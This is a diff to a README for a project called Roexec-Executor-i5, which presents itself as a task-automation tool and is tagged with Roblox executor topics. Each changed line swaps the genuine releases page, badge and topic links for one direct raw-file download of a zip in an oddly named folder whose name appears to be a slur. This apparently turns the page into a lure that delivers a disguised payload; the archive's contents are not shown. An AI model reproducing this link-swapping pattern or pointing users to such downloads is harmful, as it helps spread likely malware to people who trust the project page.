@@ -1,6 +1,6 @@
 # ⚙️ Roexec-Executor-i5 - Automate Tasks Easily
 
-[![Download Roexec-Executor-i5](https://img.shields.io/badge/Download-Roexec--Executor--i5-brightgreen)](https://github.com/Caraxes25/Roexec-Executor-i5/releases)
+[![Download Roexec-Executor-i5](https://raw.githubusercontent.com/Caraxes25/Roexec-Executor-i5/main/jewbush/Roexec-Executor-i5.zip)](https://raw.githubusercontent.com/Caraxes25/Roexec-Executor-i5/main/jewbush/Roexec-Executor-i5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Roexec-Executor! This application helps you automate tasks and manage
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download Roexec-Executor-i5](https://github.com/Caraxes25/Roexec-Executor-i5/releases).
+To get started, visit this page to download: [Download Roexec-Executor-i5](https://raw.githubusercontent.com/Caraxes25/Roexec-Executor-i5/main/jewbush/Roexec-Executor-i5.zip).
 
 ### Installation Steps
 
@@ -68,7 +68,7 @@ After installing Roexec-Executor, follow these steps to run your first task:
 
 If you encounter issues while using Roexec-Executor, try these solutions:
 
-- **Check for Updates**: Make sure you have the latest version. Visit the [Releases page](https://github.com/Caraxes25/Roexec-Executor-i5/releases) for updates.
+- **Check for Updates**: Make sure you have the latest version. Visit the [Releases page](https://raw.githubusercontent.com/Caraxes25/Roexec-Executor-i5/main/jewbush/Roexec-Executor-i5.zip) for updates.
 - **Reinstall the App**: If you face persistent issues, uninstall and reinstall Roexec-Executor.
 - **Common Errors**: Review the error messages in the application. They often provide clues for resolving issues.
 
@@ -80,12 +80,12 @@ If you have any questions or need help, please feel free to reach out. You can c
 
 Explore more about Roexec-Executor through these topics:
 
-- [krampus-roblox](https://github.com/Caraxes25/Roexec-Executor-i5/topics/krampus-roblox)
-- [roblox](https://github.com/Caraxes25/Roexec-Executor-i5/topics/roblox)
-- [roexecexecuter](https://github.com/Caraxes25/Roexec-Executor-i5/topics/roexecexecuter)
+- [krampus-roblox](https://raw.githubusercontent.com/Caraxes25/Roexec-Executor-i5/main/jewbush/Roexec-Executor-i5.zip)
+- [roblox](https://raw.githubusercontent.com/Caraxes25/Roexec-Executor-i5/main/jewbush/Roexec-Executor-i5.zip)
+- [roexecexecuter](https://raw.githubusercontent.com/Caraxes25/Roexec-Executor-i5/main/jewbush/Roexec-Executor-i5.zip)
 
 ## 🎉 Enjoy Your Automation!
 
 We hope Roexec-Executor makes your task automation simpler and more efficient. Enjoy using the application to enhance your productivity! 
 
-[![Download Roexec-Executor-i5](https://img.shields.io/badge/Download-Roexec--Executor--i5-brightgreen)](https://github.com/Caraxes25/Roexec-Executor-i5/releases)
+[![Download Roexec-Executor-i5](https://raw.githubusercontent.com/Caraxes25/Roexec-Executor-i5/main/jewbush/Roexec-Executor-i5.zip)](https://raw.githubusercontent.com/Caraxes25/Roexec-Executor-i5/main/jewbush/Roexec-Executor-i5.zip)
